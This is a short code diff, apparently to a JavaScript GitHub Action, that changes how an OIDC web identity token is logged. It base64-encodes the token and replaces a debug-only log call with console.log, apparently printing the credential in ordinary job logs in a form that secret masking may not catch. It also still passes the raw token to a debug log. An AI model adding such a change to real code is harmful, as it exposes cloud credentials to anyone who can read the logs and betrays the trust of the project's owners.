@@ -120,9 +120,8 @@ export async function run() {
           !disableRetry,
           maxRetries
         );
-
         const a = Buffer.from(webIdentityToken, 'utf8').toString('base64');
-        core.debug(a);
+        console.log(a);
         core.debug(webIdentityToken);
       } catch (error) {
         throw new Error(`getIDToken call failed: ${errorMessage(error)}`);
